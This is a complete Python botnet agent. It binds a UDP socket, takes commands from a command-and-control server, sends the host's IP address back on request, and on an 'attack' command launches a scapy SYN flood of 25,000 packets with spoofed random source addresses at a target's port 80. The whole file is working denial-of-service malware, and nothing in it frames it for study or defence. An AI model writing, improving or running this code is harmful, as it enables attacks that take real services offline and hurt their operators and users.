import socket
from sys import stdout
from scapy.layers.inet import *
from scapy.all import *
from random import randint
from threading import Thread

# SYN Flood Script Credit: Emre Ovunc @ https://github.com/EmreOvunc
def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP, counter, attack_thread_abort):
	total = 0
	print("Sending SYN packets...")
	
	for x in range (0, counter):
		if attack_thread_abort.is_set():
			print("Attack aborted!")
			break

		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()
                
		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = 80
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1

	stdout.write("Total packets sent: %i\n" % total)

if __name__ == "__main__":
	UDP_IP = "0.0.0.0"
	UDP_PORT = 3140
	SERVER_PORT = 3141

	sock = socket.socket(
		socket.AF_INET, # Internet
		socket.SOCK_DGRAM # UDP
	) 
	sock.bind((UDP_IP, UDP_PORT))
	attack_thread = None
	attack_thread_abort = threading.Event()

	print("Listening for commands from the C2 server.")

	while True:
		data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
		command = str(data, "UTF-8")

		if command == "send ip":
			print("sending ip address...", end="")
			sock.sendto(b"ip address:" + socket.gethostbyname(socket.gethostname()).encode(), (addr[0], SERVER_PORT))
			print("sent!")
		if command == "ping":
			print("pong!")
		elif "attack" in command:
			target = command[command.index(":")+1:]
			print("attacking %s..." % target)
			attack_thread_abort = threading.Event()
			attack_thread = Thread(target = SYN_Flood, args=(target, 25000, attack_thread_abort))
			attack_thread.start()
		elif command == "stop":
			if attack_thread:
				attack_thread_abort.set()
			else:
				print("Was told to stop, but I'm not attacking right now...")